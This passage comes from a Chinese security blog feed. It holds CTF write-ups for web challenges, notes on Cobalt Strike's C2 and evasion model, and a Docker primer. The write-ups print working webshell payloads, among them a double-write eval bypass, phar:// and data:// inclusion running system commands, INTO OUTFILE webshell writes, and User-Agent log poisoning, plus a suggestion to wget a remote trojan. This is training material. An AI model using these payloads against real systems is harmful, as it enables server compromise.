rel="noopener">https://namechk.com/</a></p><p>此OSINT工具是一个搜索引擎，可让您搜索域名以查看可用的内容，然后进行注册或报价的过程。</p><p><strong>（十二）病毒扫描仪</strong></p><p>VirusTotal</p><p>网站网址：<a href="https://www.virustotal.com/gui/home/upload" target="_blank" rel="noopener">https://www.virustotal.com/gui/home/upload</a></p><p>VirusTotal是一个在线工具，可让您扫描文件或URL以查看其是否具有恶意软件。</p><p><strong>（十三）视觉/集群搜索引擎</strong></p><p>1、all-io</p><p>网站网址：<a href="https://all-io.net/" target="_blank" rel="noopener">https://all-io.net/</a></p><p>all-io搜索多个源并提供一组结果，类似于任何搜索引擎。</p><p>2、alltheinternet</p><p><a href="https://www.alltheinternet.com/" target="_blank" rel="noopener">https://www.alltheinternet.com/</a></p><p><strong>（十四）网站分析</strong></p><p>BuiltWith.com</p><p>网站网址：<a href="https://builtwith.com/" target="_blank" rel="noopener">https://builtwith.com/</a></p><p>如果您需要在特定网站上收集技术详细信息，请尝试BuiltWith.com。</p><p>参考：<a href="https://mp.weixin.qq.com/s/xXvjRNGLGtTcRJMFVKEuRA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/xXvjRNGLGtTcRJMFVKEuRA</a></p><p> <a href="https://mp.weixin.qq.com/s/ZbGfkiilOUCTs0TiaH5Ifg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/ZbGfkiilOUCTs0TiaH5Ifg</a> </p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>合天WEB公开课考核CTF记录</title>
      <link href="/2020/03/08/hetianwebctf/"/>
      <url>/2020/03/08/hetianwebctf/</url>
      
        <content type="html"><![CDATA[<blockquote><p>合天疫情期间的公开课组织的CTF，自己写的一点点writeup。</p></blockquote><h2 id="题目名：phpmyadmin-（文件包含漏洞）"><a href="#题目名：phpmyadmin-（文件包含漏洞）" class="headerlink" title="题目名：phpmyadmin （文件包含漏洞）"></a>题目名：phpmyadmin （文件包含漏洞）</h2><p>当时打开是啥页面忘了，找了半天没啥发现，然后御剑扫了一下目录，发现了robots和phpmyadmin目录，phpmyadmin root账户存在弱口令（题做过已经好久了，具体密码是啥我忘了），然后就进了phpmyadmin</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/imghtphpmyadmin1.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/imghtphpmyadmin2.png" alt=""></p><p>看这数据库就知道已经有好多大佬进来过了，可以看到版本为4.8.1。这个版本存在文件包含漏洞，可以直接getshell，因为数据库是可操控的，所以可以直接将马写入并包含（<a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485036&idx=1&sn=8e9647906c5d94f72564dec5bc51a2ab&chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&mpshare=1&scene=1&srcid=0621gAv1FMtrgoahD01psMZr&pass_ticket=LqhRfckPxAVG2dF%2FjxV%2F9%2FcEb5pShRgewJe%2FttJn2gIlIyGF%2FbsgGmzcbsV%2BLmMK#rd" target="_blank" rel="noopener">phpmyadmin4.8.1后台getshell</a>），而通过robots文件的提示可以知道flag在/opt/key.txt那就直接包含得出flag。</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/imghtphpmyadmin3.png" alt=""></p><h2 id="题目名：听说越权就送flag-（越权漏洞）"><a href="#题目名：听说越权就送flag-（越权漏洞）" class="headerlink" title="题目名：听说越权就送flag  （越权漏洞）"></a>题目名：听说越权就送flag  （越权漏洞）</h2><p>打开题目是个商城cms，叫做tinyshop 商城系统，直接百度，看来已经被爆出来好多的漏洞，找到越权漏洞并直接利用。</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/imghtycctf1.png" alt=""></p><p>改参数id的值可以遍历收获地址信息，找到一个flag，然而是假的…好像真的被谁给删了，到最后又扔到burpsuite跑一波，找到了flag。</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/imghtycctf2.png" alt=""></p><h2 id="题目名：后台登录-（HTTP头和注入）"><a href="#题目名：后台登录-（HTTP头和注入）" class="headerlink" title="题目名：后台登录  （HTTP头和注入）"></a>题目名：后台登录  （HTTP头和注入）</h2><p>打开题目后403</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/imghtctfhtdl1.png" alt=""></p><p>修改请求头 x-forwarded-for <img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/imghtctfhtdl2.png" alt=""></p><p>尝试万能密码登录，直接给出flag。</p><h2 id="题目名：合天网安新闻-（注入）"><a href="#题目名：合天网安新闻-（注入）" class="headerlink" title="题目名：合天网安新闻   （注入）"></a>题目名：合天网安新闻   （注入）</h2><p>测试出存在宽字节注入<img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/imghtctfhtxww1.png" alt=""></p><p>然后直接扔进sqlmap跑</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/imghtctfhtxww2.png" alt=""></p><h2 id="题目名：你的脑袋有点大呦-（HTTP头部）"><a href="#题目名：你的脑袋有点大呦-（HTTP头部）" class="headerlink" title="题目名：你的脑袋有点大呦 （HTTP头部）"></a>题目名：你的脑袋有点大呦 （HTTP头部）</h2><p>开burpsuit抓把，返回信息提示脑袋有点大，返回头部信息找到flag</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/imghtctfndydd1.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>四叶草启航班考核CTF记录</title>
      <link href="/2020/02/27/siyecaoqihangkaohe/"/>
      <url>/2020/02/27/siyecaoqihangkaohe/</url>
      
        <content type="html"><![CDATA[<blockquote><p>题目来源于四叶草云演平台攻防启航班考核</p></blockquote><h2 id="第一题-（注入）"><a href="#第一题-（注入）" class="headerlink" title="第一题  （注入）"></a>第一题  （注入）</h2><p>测试存在注入，sqlmap跑了一遍没找到flag，into outfile ‘var/www/html/a.php’ 写入一句话木马，才到链接拿到flag。</p><h2 id="第二题-（注入）"><a href="#第二题-（注入）" class="headerlink" title="第二题  （注入）"></a>第二题  （注入）</h2><p>admin弱口令登录，burpsuite抓包发现cookie base64加密，测试cookie存在注入，into outfile 写入木马，菜刀连接getshell。</p><h2 id="第三题-（文件包含）"><a href="#第三题-（文件包含）" class="headerlink" title="第三题  （文件包含）"></a>第三题  （文件包含）</h2><p>文件包含，存在上传点，只能上传白名单 .txt上传。</p><p>payload： xxx.xxxx/?file=pahr://1.txt/2.php  ,可以把1.txt当作2.php解析，1.txt是一个zip压缩文件（含有木马内容压缩为.zip的文件改后缀为.txt）。</p><h2 id="第四题-（文件上传）"><a href="#第四题-（文件上传）" class="headerlink" title="第四题  （文件上传）"></a>第四题  （文件上传）</h2><p>文件上传，测试为白名单过滤，.pht可成功上传，访问上传文件发现过滤php, &lt;? ,eval字符</p><p>payload：&lt;&lt;??pphphp evevalal($_POST[a]);?&gt;          双写成功绕过，菜刀连接。</p><h2 id="第五题-（文件上传）"><a href="#第五题-（文件上传）" class="headerlink" title="第五题  （文件上传）"></a>第五题  （文件上传）</h2><p>文件上传，前端js限制 burpsuit抓包改php后缀成功上传。</p><h2 id="第六题-（命令执行）"><a href="#第六题-（命令执行）" class="headerlink" title="第六题  （命令执行）"></a>第六题  （命令执行）</h2><p>命令执行，代码显示变量1内容小于8</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/imgsiyecaoqihang6.png" alt=""></p><p>传入<code>?1=ls ../</code>发现key文件，想办法构造<code>cat ../key</code>，因长度输入限制，参考网上案例把命令写入到文件然后执行，此方法是将命令拆分依次构造文件名然后写入一个文件中，因为/不能作为文件名，所以尝试失败。<br>解决办法:构造weget命令从远程下载木马直接getshell（不再演示，原理相同）。</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/imgsiyacaoqihang6-1.png" alt=""></p><p>参考： <a href="https://xz.aliyun.com/t/2748" target="_blank" rel="noopener">https://xz.aliyun.com/t/2748</a> </p><p>​             <a href="https://www.cnblogs.com/-chenxs/p/11981586.html" target="_blank" rel="noopener">https://www.cnblogs.com/-chenxs/p/11981586.html</a> </p><h2 id="第七题-（文件包含）"><a href="#第七题-（文件包含）" class="headerlink" title="第七题  （文件包含）"></a>第七题  （文件包含）</h2><p>文件包含</p><p>​    payload：?file=data://txt/plain,&lt;?php system(‘ls’); ?&gt;  data伪协议直接执行系统命令，找到flag</p><h2 id="第八题-（文件包含）"><a href="#第八题-（文件包含）" class="headerlink" title="第八题  （文件包含）"></a>第八题  （文件包含）</h2><p>文件包含</p><p>​    可成功包含日志文件</p><p>​    burpsuite抓包将一句话木马写入ua头，菜刀连接。（ua等信息可记录进日志文件）</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/imgsiyecaoqihang8-2.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobalt Strike 4.0第一节Operations笔记（转载）</title>
      <link href="/2020/02/20/cs1op/"/>
      <url>/2020/02/20/cs1op/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这是cobalt strike 4.0官方教程的第一节笔记。看到别人写的直接转载了，自己懒得写了，下方是我自己传的视频。（英语水平及精力有限，错误之处欢迎在B站私信）</p><iframe height="500" width="700" src="//player.bilibili.com/player.html?aid=85159864&cid=145589441&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe><a id="more"></a><p>传送门：<a href="https://www.bilibili.com/video/av85159864/" target="_blank" rel="noopener">渗透测试 Cobalt_Strike 4中英双字</a></p><p>以下为转载内容：</p></blockquote><h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><ul><li>本文主要是看了 Cobalt Strike 4.0 Youtube 官方教程第一课【Operations】之后记的笔记，资源见参考文档。</li><li>教程的授课者是 Cobalt Strike 的创造者 Raphael Mudge。可以说没人比他更权威了。</li><li>CS 系列教程及手册的好处就在于其中融入了很多红队的思想、策略和模型，CS 自己的定位也是「缩小渗透测试工具和高级威胁恶意软件之间的差距」这样一个工具。学习 CS 对了解后渗透帮助颇多。</li><li>本文记录的视频对应了 CS 手册的第一章 <code>Operations</code> ，也就是操作。笔记记录是有选择的，一些基本的 CS 中的东西比如 <code>可拓展 C2</code>、<code>cna 插件</code>、<code>团队服务器</code>，因为关于这些的基本操作我已经了解了，就没有记。</li></ul><p>闲话不多说，下面进入笔记正文部分。</p><h1 id="0x02-基础概念"><a href="#0x02-基础概念" class="headerlink" title="0x02 基础概念"></a>0x02 基础概念</h1><p>要了解一个领域，就要先了解其领域内的概念范畴。CS 中的一些概念包括：</p><ul><li>agent<br><code>agent</code> 的本意为代理。当攻击者通过代码执行，有一个 <code>agent</code> 运行在目标网络中，就可以对目标网络进行命令与控制。所以 <code>agent</code> 实际上相当于 Beacon payload。</li><li>Staging 服务器<br>在 Cobalt Strike 中，为了获取目标主机的 Beacon shell，必须先要传送 payload。payload 就是攻击执行的内容。<br>传递 payload 时候，根据目标的网络、主机环境，可以选择分阶段传递 payload，也可以不分阶段直接丢一个 payload。<br>分阶段传递中，Payload 通常被分为两部分：<code>payload stage</code> 和 <code>payload stager</code>。stager 是一个小程序，通常是手工优化的汇编指令，用于下载一个 payload stage、把它注入内存，然后对其传达执行命令。这个过程被称为 staging（分阶段）。<br>staging（分阶段）过程在一些攻击行动中是必要的。很多攻击中对于能加载进内存并在成功漏洞利用后执行的数据大小存在严格限制。这会极大地限制你的后渗透选择，除非你分阶段传送你的后渗透 payload。<br>在这里的 <code>staging server</code>，其实是指最开始用于传递 payload 的那台攻击机器。也就是获取初始权限的服务器。所以可想而知此服务器具有以下特点：<ol><li>托管客户端的工具，接收来自 Beacon 的初始回复</li><li>可能承担初始的权限提升和下载持久性 payload 等功能</li><li>此服务器有较高暴露风险，可能会被发现、封锁和反制</li></ol></li></ul><h1 id="0x03-本文要点"><a href="#0x03-本文要点" class="headerlink" title="0x03 本文要点"></a>0x03 本文要点</h1><ul><li>有目标攻击的攻击链解析</li><li>对 Cobalt Strike 的基本介绍</li><li>多团队服务器模型</li><li>分布式操作模型</li><li>Cobalt Strike 的日志和报告功能</li></ul><h1 id="0X04-课程的基本思路"><a href="#0X04-课程的基本思路" class="headerlink" title="0X04 课程的基本思路"></a>0X04 课程的基本思路</h1><p><strong>一场典型的有目标的攻击的四个目标</strong></p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/imgcs1op-1.jpg" alt=""></p><p>其中 Cobalt Strike 侧重于 <code>后渗透阶段</code>。后渗透即为完成想要在目标网络中达到的目的的一个攻击步骤。如数据挖掘、监视用户、键盘记录、根据用户活动确定目标机会等。</p><p>此攻击流程也可以用下图这个 <code>攻击链</code> 来概括：</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/imgcs1op-2.jpg" alt=""></p><p>这个攻击链和 CS 手册中的章节是对应的：</p><ol><li>操作</li><li>基础设施</li><li>C2</li><li>武器化</li><li>初始权限</li><li>后渗透</li><li>权限提升</li><li>横向移动</li><li>Pivoting<ul><li>第一章操作。主要介绍了一些 CS 的基本理念和模型。</li><li>第二章基础设置。主要介绍了一些监听器和重定向器的详细配置。</li><li>第三章 C2。与 C2 通信的时候会面临一些权衡，因为很多行为会导致暴露，所以在和安全产品对抗的过程中，我们必须在风险和目标之间选择最适合我们的选项。另外这一章也会讲如何改变 C2 的流量特征。</li><li>第四章武器化。讲如何将 payload 与在目标机器上运行的程序相匹配。</li><li>第五章初始权限。目标就是获取对目标网络上运行的一个 agent 的控制。</li><li>第六章后渗透、第七章权限提升、第八章横向移动、第九章 Pivoting。这些章节都是围绕着后渗透目标，讲了后渗透的流程及 CS 中的一些攻击流程和原语。</li></ul></li></ol><p>在此之外，规避 <code>Evasion</code> 也是一个值得讨论的话题。在本视频中，作者讲了规避的哲学：首先要明白的一个原则是：决定=风险+回报，每次在 CS 中选择的一个选项，就会产生一个行为，行为会导致一个事件 <code>event</code>，此事件会有一个行为特征，杀软或其他安全产品会根据此特征判断行为是否是恶意的。</p><p>所以如何去成功规避呢？</p><ul><li>了解使用的工具及其行为。<br>比如需要了解 CS 的各个选项及其产生的行为特征在流量上的体现。</li><li>获取和理解目标环境的防御信息。<br>比如在做免杀测试的时候，有什么测什么，而不是只看VT上过了多少家。意思就是根据对方环境的杀软体系，模拟此环境来针对性做免杀。</li><li>决定要使用的最好的选项。<br>同样是规避，是一开始就减少流量特征的产生、还是说伪造流量特征让目标环境中的安全产品判定为非恶意呢。根据决定=风险+回报的原则选择适合自己目的的选项。</li></ul><p>然后介绍完课程的基本思路之后，就开始讲第一章 <code>Operations</code> 操作，这一章主要讲四个部分：</p><ul><li>对 Cobalt Strike 的基本介绍</li><li>Cobalt Strike 的合作模型</li><li>分布式操作模型</li><li>Cobalt Strike 的日志和报告功能</li></ul><h1 id="0X05-第一章：操作"><a href="#0X05-第一章：操作" class="headerlink" title="0X05 第一章：操作"></a>0X05 第一章：操作</h1><h2 id="1、对-Cobalt-Strike-的基本介绍"><a href="#1、对-Cobalt-Strike-的基本介绍" class="headerlink" title="1、对 Cobalt Strike 的基本介绍"></a>1、对 Cobalt Strike 的基本介绍</h2><ul><li>Cobalt Strike 出生于 2012/06</li><li>Beacon agent 的功能于 2012/09 被加入</li><li>Cobalt Strike 工具的使命是：缩小渗透测试工具和先进的高级威胁恶意软件之间的差距。</li></ul><p><strong>Cobalt Strike 的一些基本功能模块：</strong></p><p>Beacon</p><ul><li><p>Beacon 是 Cobalt Strike 的 Payload</p></li><li><p>有两种通信策略（与团队服务器，CS 中以团队服务器作为 C2）</p></li></ul><ul><li>异步式通信 = 频率低、速度慢</li><li>交互式通信 = C2 对 Beacon 实时控制</li></ul><ul><li><p>使用 HTTP/S 或 DNS 来出口网络数据</p></li><li><p>使用 SMB 命名管道或 TCP(sockets) 来进行点对点 C2 通信</p></li><li><p>Beacon 是 CS 的远程管理功能模块</p></li></ul><p>团队服务器</p><p>启动命令为（必须在 Linux 主机上启动团队服务器）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;teamserver &lt;host&gt; &lt;password&gt; [&#x2F;path&#x2F;to&#x2F;c2.profile] [YYYY-MM-DD]</span><br></pre></td></tr></table></figure><ul><li><code>[YYYY-MM-DD]</code> 是 Beacon payloads 在此服务器上运行的杀死时间，在此时间后，Beacon payload 将停止启动。当它下一次醒来时就会离开并清空数据。这是帮助攻击人员在一次行动后清理 Beacon Payloads 的好工具。</li></ul><h2 id="2、Cobalt-Strike-的合作模型"><a href="#2、Cobalt-Strike-的合作模型" class="headerlink" title="2、Cobalt Strike 的合作模型"></a>2、Cobalt Strike 的合作模型</h2><p>略。（因为本部分没讲什么重要内容，都是我已知的。）</p><h2 id="3、分布式操作模型（Distrubuted-Operations）"><a href="#3、分布式操作模型（Distrubuted-Operations）" class="headerlink" title="3、分布式操作模型（Distrubuted Operations）"></a>3、分布式操作模型（<code>Distrubuted Operations</code>）</h2><ul><li><p>Cobalt Strike 是为分布式操作而设计的</p></li><li><p>客户端可以同时连接到多个团队服务器</p></li></ul><ul><li>如 <code>beacon 团队服务器</code>、<code>钓鱼团队服务器</code>、<code>侦查团队服务器</code>、<code>攻击团队服务器</code>、<code>后渗透团队服务器</code>等多个团队服务器，就是分解整个攻击链</li><li>每个团队服务器有单独的数据模型和日志</li></ul><ul><li><p>分布式操作模型可以避免行动中的单点故障/失败，如果仅有一台团队服务器，那么这一台攻击主机可能会被识别或封锁。</p></li><li><p>具体操作：</p></li></ul><ul><li>连接到多个团队服务器</li></ul><pre><code>- `Cobalt Strike` → `New Connection`</code></pre><ul><li>关闭到某团队服务器的连接</li></ul><pre><code>- `Cobalt Strike` → `Close`</code></pre><ul><li>重命名团队服务器标签页</li></ul><pre><code>- [标签页按钮] → `Rename`</code></pre><p>问：「在一个 CS 客户端中可以连接到多个团队服务器」这样的设计有什么好处？</p><p>答：好处在于：</p><ol><li>方便团队服务器之间的权限传递</li><li>当连接到多个团队服务器时，Cobalt Strike 可以把所有服务器的数据合并成一个模型，获取根据时间线的事件排序，方便写报告。</li></ol><hr><p>在这里要写一下多团队服务器模型的多种架构：</p><p><strong>1、 最基本的多团队服务器模型：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/imgcs1op-3.jpg" alt=""></p><ul><li>注：蓝色闪电代表高风险</li></ul><p>其中，以三种团队服务器的形式来组织和分离基础设施：</p><ul><li>Staging 服务器</li></ul><ul><li>获取初始权限的服务器</li><li>托管客户端的工具和接收初始回复</li><li>承担初始的权限提升和下载持久性程序的功能</li><li>这种服务器可能具有明显的网络指标，行为事件易被检测到，可能被防御者快速发现、具有较高风险</li></ul><ul><li>长控服务器</li></ul><ul><li>与 Beacon 以慢速度、低频率保持通信</li><li>接收持久性的回复，是重回网络的生命线</li><li>可能会根据需要传递权限给后渗透服务器</li><li>是具有不同流量指标的主机，也可能有不同的工具集</li></ul><ul><li>后渗透服务器</li></ul><ul><li>后渗透和横向移动</li></ul><p><strong>2、 结合攻击链的多团队服务器模型：</strong></p><p>分解整个攻击链，让不同的团队服务器承担不同的攻击环节和功能：</p><p>如 <code>beacon 团队服务器</code>、<code>钓鱼团队服务器</code>、<code>侦查团队服务器</code>、<code>攻击团队服务器</code>、<code>后渗透团队服务器</code>等多个团队服务器。</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/imgcs1op-4.jpg" alt=""></p><ul><li>注：蓝色闪电代表高风险</li></ul><p><strong>3、 具有权限管理单元的多团队服务器模型：</strong></p><p>权限管理是一项重要的工作，也是红队应该投入的资源。</p><p>除了多团队服务器来保权限的方案之外，当涉及到多个目标网络时，可以抽象出一个权限管理的单元来对多个权限做全局的管理和维持。</p><p>可伸缩红队操作模型（<code>scaling red operations</code>）就是这种全局权限管理设想的实现。</p><p>可伸缩红队操作模型分为两个层次，第一层是针对每一个单个的目标网络的 <code>目标单元</code>；第二层是对多个目标网络的全局管理层次 <code>权限管理单元</code>：</p><ul><li>目标单元</li></ul><ul><li>负责特定的某个目标网络</li><li>获取权限、后渗透、横向移动</li><li>维持本地基础设施的任务</li></ul><ul><li>权限管理单元</li></ul><ul><li>维持所有目标网络的权限</li><li>其管理的权限可能是自己获取的，也可能是从目标单元中接收的</li><li>按照需求将权限传递给目标单元</li><li>维持全局的基础设施，持续的接收回复（与每个权限保持心跳接收）</li></ul><p>根据此模型，红队中需要有以下这些团队角色：</p><ul><li>获取权限</li></ul><ul><li>主要任务是：武器化的获取初始权限</li><li>横向移动，获取&amp;拓展立足点</li></ul><ul><li>后渗透</li></ul><ul><li>主要任务是：完成想要在目标网络中达到的目的</li><li>数据挖掘、监视用户、键盘记录、根据用户活动确定目标机会等</li></ul><ul><li>本地权限管理员（单个目标网络）</li></ul><ul><li>管理来自被控目标的回复</li><li>准备基础设施</li><li>持久性</li><li>与全局权限管理员之间进行会话的传递和接收</li></ul><ul><li>全局权限管理员（多目标网络的情况下）</li></ul><ul><li>对所有 shell 进行管理和保护</li><li>建立、配置长控服务器和后渗透服务器</li><li>管理长控团队服务器主机，并观察其回复的健康状况</li><li>将持久性和防御策略（行为安全）委托给本地权限管理员</li></ul><p>所以此时抽象出权限管理单元的多团队服务器模型的示意图为：</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/imgcs1op-5.jpg" alt=""></p><h2 id="4、Cobalt-Strike-的日志和报告功能"><a href="#4、Cobalt-Strike-的日志和报告功能" class="headerlink" title="4、Cobalt Strike 的日志和报告功能"></a>4、Cobalt Strike 的日志和报告功能</h2><p><strong>日志：</strong></p><p>Cobalt Strike 中的日志记录工具： <code>logs</code></p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/imgcs1op-6.jpg" alt=""></p><ul><li>以格式化的日志形式记录了所有发生在 Cobalt Strike 团队服务器上的事件。</li><li>包括击键记录、截图记录、会话内容、上传文件的哈希、beacon payload 的输出等。</li></ul><p><strong>报告：</strong></p><ul><li><p>当连接到多个团队服务器时，Cobalt Strike 可以把所有服务器的数据合并成一个模型，获取根据时间线的事件排序，可以导出一份综合的报告。</p></li><li><p>主要的一些可以导出的报告类型为；</p></li></ul><ul><li>IoC 指标报告（类似于一些 APT 报告）。</li><li>活动报告。有一个基于时间表的活动，讲述了 <code>when</code>、<code>where</code>、<code>why</code>。</li><li>会话报告。按主机单独组织</li><li>TTP 报告。基于 MITRE 框架下的 CS 活动（策略+事件+缓解+监测）</li></ul><hr><p>参考文档：</p><p>[1] <a href="https://www.youtube.com/watch?v=q7VQeK533zI&list=PL9HO6M_MU2nfQ4kHSCzAQMqxQxH47d1no" target="_blank" rel="noopener">Youtube 视频 - Red Team Ops with Cobalt Strike (1 of 9): Operations</a>，Youtube，Raphael Mudge<br>[2] <a href="https://www.bilibili.com/video/av85159864" target="_blank" rel="noopener">B 站视频 - 渗透测试 Cobalt_Strike 4中英双字</a>，Bilibili，喵的起名<br>[3] <a href="https://www.cobaltstrike.com/downloads/csmanual40.pdf" target="_blank" rel="noopener">Cobalt Strike mannual 4.0</a>，Cobalt Strike 官网</p><blockquote><p><a href="http://blog.leanote.com/post/snowming/62ec1132a2c9" target="_blank" rel="noopener">原文地址 http://blog.leanote.com/post/snowming/62ec1132a2c9 </a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> cobalt strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker快速入门</title>
      <link href="/2020/02/19/docker-1/"/>
      <url>/2020/02/19/docker-1/</url>
      
        <content type="html"><![CDATA[<h1 id="Docker快速入门"><a href="#Docker快速入门" class="headerlink" title="Docker快速入门"></a>Docker快速入门</h1><h2 id="一、Docker简介"><a href="#一、Docker简介" class="headerlink" title="一、Docker简介"></a>一、Docker简介</h2><p>Docker工作原理其实就类似于vmworkstation虚拟出一个环境来运行需要运行的东西。以下是百度百科的介绍：<br>Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中,然后发布到任何流行的Linux机器或Windows 机器上,也可以实现虚拟化,容器是完全使用沙箱机制,相互之间不会有任何接口。</p><p>一个完整的Docker有以下几个部分组成：</p><ol><li><p>DockerClient客户端</p></li><li><p>Docker Daemon守护进程</p></li><li><p>Docker Image镜像</p></li><li><p>DockerContainer容器</p></li></ol><h2 id="二、docker的操作介绍"><a href="#二、docker的操作介绍" class="headerlink" title="二、docker的操作介绍"></a>二、docker的操作介绍</h2><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/imgdocker.png" alt=""><br>这张图解释了docker的基本操作过程<br>container是容器，容器就是虚拟出的一个环境，他有三种状态运行、停止、暂停。而容器是依赖于镜像（image）建立起来的，镜像有可以从镜像仓库来获取，当然也支持将自己的本地镜像推到镜像仓库去，同时镜像也可以保存为tar文件，可供其他机器导入使用。</p><h2 id="三、docker的安装"><a href="#三、docker的安装" class="headerlink" title="三、docker的安装"></a>三、docker的安装</h2><p>docker ce是免费社区版，docker ee是企业版，一般个人用户安装免费版本就可以了。<br>安装文档如下：<br><a href="https://docs.docker.com/docker-for-mac/install/" target="_blank" rel="noopener">mac官方安装文档</a><br><a href="https://docs.docker.com/docker-for-windows/install/" target="_blank" rel="noopener">windows官方安装文档</a><br><a href="https://docs.docker.com/install/linux/docker-ce/centos/" target="_blank" rel="noopener">linux官方安装文档（以centos为例）</a><br><a href="https://www.runoob.com/docker/ubuntu-docker-install.html" target="_blank" rel="noopener">runoob docker安装文档</a><br>安装过程不再做演示，这里以linux下安装完</p><ol><li><p>启动docker</p><p> $ sudo systemctl start docker</p></li><li><p>通过运行 hello-world 映像来验证是否正确安装了 Docker Engine-Community</p><p> $ sudo docker run hello-world    #本地没有hello-world镜像会自己下载镜像并运行</p></li></ol><p>显示以下内容说明成功运行<br><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/imgdockerhello.png" alt=""></p><h2 id="四、docker操作"><a href="#四、docker操作" class="headerlink" title="四、docker操作"></a>四、docker操作</h2><ol><li><p>搜索镜像<br>比如搜索镜像hello-world，用以下命令可搜索镜像仓库中hello-world相关镜像。</p><p> $ docker search hello-world</p></li><li><p>下载镜像<br>比如下载basybox镜像到本地</p><p> $ docker pull busybox</p></li><li><p>创建容器运行（busybox为例）</p><p> $ docker run busybox</p></li></ol><p>此时，basybox已经开始运行。</p><ol start="4"><li><p>查看所有创建的容器</p><p> $ docker ps -a</p><p> <img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/imgdockerps.png" alt=""></p></li></ol><p>可看到容器ID，容器状态等信息</p><p>下面列出了一些入门常用命令：</p><pre><code>docker ps -a    #查所创建的容器docker images    #查看本地镜像docker pull    #下拉镜像docker run    #运行镜像创建容器docker stop 容器ID    #停止运行容器docker images     #显示本地所有镜像docker rm 容器ID     #删除容器docker rmi 容器ID    #删除镜像docker rm -f 容器ID    #强制删除容器（运行中也可删除）docker rm $(docker ps -a -q)    #删除所有未运行容器docker info    #查看当前docker详细信息docker pause 容器ID    #暂停容器docker unpause 容器ID    #暂停转运行docker kiil 容器ID    #结束容器进程docker restart 容器ID    #重启容器</code></pre>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLmap Tamper编写（笔记）</title>
      <link href="/2020/01/20/sqlmaptamperbianxie/"/>
      <url>/2020/01/20/sqlmaptamperbianxie/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p> <code>$ python sqlmap.py --list-tampers        #查看内置tamper</code> </p><p>sqlmap提供了很多的内置tamper，其包含了常见数据库的sql注入绕过，可在特定条件下进行SQL注入绕过防御。</p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p> <code>--tamper=xxx.py</code> </p><p>使用时加上tamper选项即可。</p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>根据具体情况编写自己的tamper脚本</p><ol><li><p>依据自己当前分析或fuzz出的原理</p></li><li><p>照猫画虎，动手编写</p></li></ol><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>先看一下内置tamper  base64encode.py的写法，了解了内置tamper的写法，只需对此照猫画虎即可！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env 